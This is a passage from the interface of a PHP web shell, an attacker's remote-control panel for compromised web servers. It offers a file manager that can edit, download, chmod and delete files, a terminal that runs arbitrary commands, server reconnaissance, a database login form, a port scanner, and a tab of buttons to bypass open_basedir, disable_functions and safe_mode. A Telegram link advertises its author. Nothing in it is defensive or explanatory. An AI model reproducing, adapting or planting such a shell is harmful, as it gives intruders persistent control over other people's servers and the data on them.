                            $isWritable = isWritableEnhanced($itemPath);
                            $modified = @filemtime($itemPath);
                    ?>
                    <tr class="folder-row">
                        <td>
                            <a href="?tab=filemanager&p=<?php echo urlencode($itemPath); ?>">
                                <span class="perm-indicator <?php echo $isWritable ? 'writable' : 'readonly'; ?>"></span>
                                <span class="file-icon">??</span>
                                <span class="<?php echo $isWritable ? 'perm-writable' : 'perm-readonly'; ?>">
                                    <?php echo htmlspecialchars($folder); ?>
                                </span>
                            </a>
                        </td>
                        <td>Folder</td>
                        <td>-</td>
                        <td class="<?php echo $isWritable ? 'perm-writable' : 'perm-readonly'; ?>">
                            <?php echo $perms; ?>
                        </td>
                        <td><?php echo $modified ? date('Y-m-d H:i', $modified) : '-'; ?></td>
                        <td>
                            <div class="file-actions">
                                <a href="#" onclick="renameItem('<?php echo htmlspecialchars($folder); ?>'); return false;">Rename</a>
                                <a href="#" onclick="chmodItem('<?php echo htmlspecialchars($folder); ?>'); return false;">Chmod</a>
                                <a href="?tab=filemanager&p=<?php echo urlencode($currentPath); ?>&do=delete&item=<?php echo urlencode($folder); ?>" 
                                   class="delete" onclick="return confirm('Delete this folder and all its contents?')">Delete</a>
                            </div>
                        </td>
                    </tr>
                    <?php endforeach; } ?>
                    
                    <?php
                    // Display files
                    if(!empty($sortedContents['files'])) {
                        echo '<tr class="separator-row"><td colspan="6">?? Files</td></tr>';
                        foreach($sortedContents['files'] as $file):
                            $itemPath = $currentPath . $file;
                            $size = @filesize($itemPath);
                            $perms = getPermissions($itemPath);
                            $isWritable = isWritableEnhanced($itemPath);
                            $modified = @filemtime($itemPath);
                            $ext = strtoupper(pathinfo($file, PATHINFO_EXTENSION) ?: 'FILE');
                            
                            if($size !== false) {
                                if($size < 1024) $size = $size . ' B';
                                elseif($size < 1048576) $size = round($size/1024, 1) . ' KB';
                                elseif($size < 1073741824) $size = round($size/1048576, 1) . ' MB';
                                else $size = round($size/1073741824, 1) . ' GB';
                            } else {
                                $size = '?';
                            }
                    ?>
                    <tr>
                        <td>
                            <span style="display: inline-flex; align-items: center; gap: 8px;">
                                <span class="perm-indicator <?php echo $isWritable ? 'writable' : 'readonly'; ?>"></span>
                                <span class="file-icon">??</span>
                                <span class="<?php echo $isWritable ? 'perm-writable' : 'perm-readonly'; ?>">
                                    <?php echo htmlspecialchars($file); ?>
                                </span>
                            </span>
                        </td>
                        <td><?php echo $ext; ?></td>
                        <td><?php echo $size; ?></td>
                        <td class="<?php echo $isWritable ? 'perm-writable' : 'perm-readonly'; ?>">
                            <?php echo $perms; ?>
                        </td>
                        <td><?php echo $modified ? date('Y-m-d H:i', $modified) : '-'; ?></td>
                        <td>
                            <div class="file-actions">
                                <a href="?tab=filemanager&p=<?php echo urlencode($currentPath); ?>&do=edit&item=<?php echo urlencode($file); ?>">Edit</a>
                                <a href="?tab=filemanager&p=<?php echo urlencode($currentPath); ?>&do=download&item=<?php echo urlencode($file); ?>">Download</a>
                                <a href="#" onclick="renameItem('<?php echo htmlspecialchars($file); ?>'); return false;">Rename</a>
                                <a href="#" onclick="chmodItem('<?php echo htmlspecialchars($file); ?>'); return false;">Chmod</a>
                                <a href="?tab=filemanager&p=<?php echo urlencode($currentPath); ?>&do=delete&item=<?php echo urlencode($file); ?>" 
                                   class="delete" onclick="return confirm('Delete this file?')">Delete</a>
                            </div>
                        </td>
                    </tr>
                    <?php endforeach; } ?>
                    
                    <?php if(empty($sortedContents['folders']) && empty($sortedContents['files'])): ?>
                    <tr>
                        <td colspan="6" class="empty">Empty directory</td>
                    </tr>
                    <?php endif; ?>
                </tbody>
            </table>
            <?php endif; ?>
        </div>
        
        <!-- Terminal Tab -->
        <div class="tab-content <?php echo $activeTab === 'terminal' ? 'active' : ''; ?>" id="terminal">
            <div class="terminal">
                <div class="terminal-output"><?php echo htmlspecialchars($commandOutput); ?></div>
                <form method="post" class="terminal-input">
                    <input type="text" name="command" placeholder="Enter command..." autocomplete="off">
                    <button type="submit" class="btn">Execute</button>
                </form>
            </div>
        </div>
        
        <!-- System Info Tab -->
        <div class="tab-content <?php echo $activeTab === 'info' ? 'active' : ''; ?>" id="info">
            <div class="info-grid">
                <div class="info-card">
                    <h3>??? System Information</h3>
                    <div class="info-item">
                        <span class="info-label">Operating System</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['os']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Hostname</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['hostname']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">User</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['user']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Server IP</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['ip']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Server Port</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['port']); ?></span>
                    </div>
                </div>
                
                <div class="info-card">
                    <h3>?? PHP Configuration</h3>
                    <div class="info-item">
                        <span class="info-label">PHP Version</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['php_version']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Server Software</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['server']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Safe Mode</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['safe_mode']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Open Basedir</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['open_basedir']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Disabled Functions</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['disable_functions']); ?></span>
                    </div>
                </div>
                
                <div class="info-card">
                    <h3>?? Disk Usage</h3>
                    <div class="info-item">
                        <span class="info-label">Total Space</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['disk_total']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Used Space</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['disk_used']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Free Space</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['disk_free']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Usage</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['disk_percent']); ?></span>
                    </div>
                    <div class="progress-bar">
                        <div class="progress-fill" style="width: <?php echo htmlspecialchars($systemInfo['disk_percent']); ?>"></div>
                    </div>
                </div>
                
                <div class="info-card">
                    <h3>?? PHP Limits</h3>
                    <div class="info-item">
                        <span class="info-label">Memory Limit</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['memory_limit']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Max Execution Time</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['max_execution_time']); ?>s</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Upload Max Filesize</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['upload_max_filesize']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Post Max Size</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['post_max_size']); ?></span>
                    </div>
                </div>
                
                <div class="info-card">
                    <h3>?? Extensions</h3>
                    <div class="info-item">
                        <span class="info-label">MySQL</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['mysql']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">cURL</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['curl']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Allow URL Fopen</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['allow_url_fopen']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Allow URL Include</span>
                        <span class="info-value"><?php echo htmlspecialchars($systemInfo['allow_url_include']); ?></span>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Database Tab -->
        <div class="tab-content <?php echo $activeTab === 'database' ? 'active' : ''; ?>" id="database">
            <h3 style="margin-bottom: 20px; color: #58a6ff;">Database Connection</h3>
            <form method="post">
                <div class="tool-group" style="width: 100%; margin-bottom: 15px;">
                    <label>Host:</label>
                    <input type="text" name="db_host" placeholder="localhost" value="localhost">
                </div>
                <div class="tool-group" style="width: 100%; margin-bottom: 15px;">
                    <label>Username:</label>
                    <input type="text" name="db_user" placeholder="root">
                </div>
                <div class="tool-group" style="width: 100%; margin-bottom: 15px;">
                    <label>Password:</label>
                    <input type="password" name="db_pass" placeholder="">
                </div>
                <div class="tool-group" style="width: 100%; margin-bottom: 15px;">
                    <label>Database:</label>
                    <input type="text" name="db_name" placeholder="">
                </div>
                <button type="submit" class="btn btn-success">Connect</button>
            </form>
        </div>
        
        <!-- Network Tab -->
        <div class="tab-content <?php echo $activeTab === 'network' ? 'active' : ''; ?>" id="network">
            <h3 style="margin-bottom: 20px; color: #58a6ff;">Port Scanner</h3>
            <form method="post">
                <div class="tool-group" style="width: 100%; margin-bottom: 15px;">
                    <label>Host:</label>
                    <input type="text" name="scan_host" placeholder="127.0.0.1" value="127.0.0.1">
                </div>
                <div class="tool-group" style="width: 100%; margin-bottom: 15px;">
                    <label>Port Start:</label>
                    <input type="number" name="scan_port_start" placeholder="1" value="1">
                </div>
                <div class="tool-group" style="width: 100%; margin-bottom: 15px;">
                    <label>Port End:</label>
                    <input type="number" name="scan_port_end" placeholder="1000" value="1000">
                </div>
                <button type="submit" class="btn btn-warning">Scan</button>
            </form>
        </div>
        
        <!-- Bypass Tab -->
        <div class="tab-content <?php echo $activeTab === 'bypass' ? 'active' : ''; ?>" id="bypass">
            <h3 style="margin-bottom: 20px; color: #58a6ff;">Security Bypass</h3>
            <div class="tools">
                <a href="?tab=bypass&bypass=open_basedir" class="btn btn-warning">Bypass open_basedir</a>
                <a href="?tab=bypass&bypass=disable_functions" class="btn btn-warning">Bypass disable_functions</a>
                <a href="?tab=bypass&bypass=safe_mode" class="btn btn-warning">Bypass safe_mode</a>
            </div>
        </div>
    </div>
    
    <!-- TELEGRAM BUTTON -->
    <a href="https://t.me/bdxroot3" target="_blank" class="telegram-btn">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
        </svg>
        <span>Telegram</span>
    </a>
    
    <!-- New File Modal -->
    <div id="newFileModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">Create New File</div>
            <form method="post">
                <div class="modal-body">
                    <input type="text" name="newfile" placeholder="Filename (e.g., index.php)" required>
                    <textarea name="filecontent" placeholder="File content (optional)"></textarea>
                </div>
                <div class="modal-footer">
                    <button type="submit" class="btn btn-success">Create</button>
                    <button type="button" class="btn btn-danger" onclick="closeModal('newFileModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- New Folder Modal -->
    <div id="newFolderModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">Create New Folder</div>
            <form method="post">
                <div class="modal-body">
                    <input type="text" name="newfolder" placeholder="Folder name" required>
                </div>
                <div class="modal-footer">
                    <button type="submit" class="btn btn-success">Create</button>
                    <button type="button" class="btn btn-danger" onclick="closeModal('newFolderModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <script>
        // Tab switching
        function switchTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Remove active class from all tab buttons
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Show selected tab
            document.getElementById(tabName).classList.add('active');
            
            // Add active class to selected tab button
            document.querySelector(`.tab:nth-child(${getTabIndex(tabName)})`).classList.add('active');
        }
        
        function getTabIndex(tabName) {
            const tabs = ['filemanager', 'terminal', 'info', 'database', 'network', 'bypass'];
            return tabs.indexOf(tabName) + 1;
        }
        
        // Modal functions
        function showNewFileModal() {
            document.getElementById('newFileModal').classList.add('active');
        }
        
        function showNewFolderModal() {
            document.getElementById('newFolderModal').classList.add('active');
        }
        
        function closeModal(id) {
            document.getElementById(id).classList.remove('active');
        }
        
        // Rename function
        function renameItem(oldName) {
            var newName = prompt('Enter new name:', oldName);
            if(newName && newName !== oldName) {
                var form = document.createElement('form');
                form.method = 'post';
                form.innerHTML = '<input type="hidden" name="oldname" value="' + oldName + '">' +
                               '<input type="hidden" name="newname" value="' + newName + '">';
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        // Chmod function
        function chmodItem(item) {
            var mode = prompt('Enter new permissions (e.g., 755):', '755');
            if(mode) {
                var form = document.createElement('form');
                form.method = 'post';
                form.innerHTML = '<input type="hidden" name="chmod_item" value="' + item + '">' +
                               '<input type="hidden" name="chmod_value" value="' + mode + '">';
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        // Auto-hide notifications
        setTimeout(function() {
            var notifications = document.querySelectorAll('.notification');
            notifications.forEach(function(n) {
                n.style.opacity = '0';
                setTimeout(function() { n.style.display = 'none'; }, 300);
            });
        }, 3000);
        
        // Keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            if(e.ctrlKey && e.key === 'n') {
                e.preventDefault();
                showNewFileModal();
            }
            if(e.ctrlKey && e.shiftKey && e.key === 'N') {
                e.preventDefault();
                showNewFolderModal();
            }
            if(e.key === 'Escape') {
                document.querySelectorAll('.modal.active').forEach(function(m) {
                    m.classList.remove('active');
                });
            }
        });
        
        // Click outside modal to close
        document.querySelectorAll('.modal').forEach(function(modal) {
            modal.addEventListener('click', function(e) {
                if(e.target === modal) {
                    modal.classList.remove('active');
                }
            });
        });
    </script>
</body>
</html>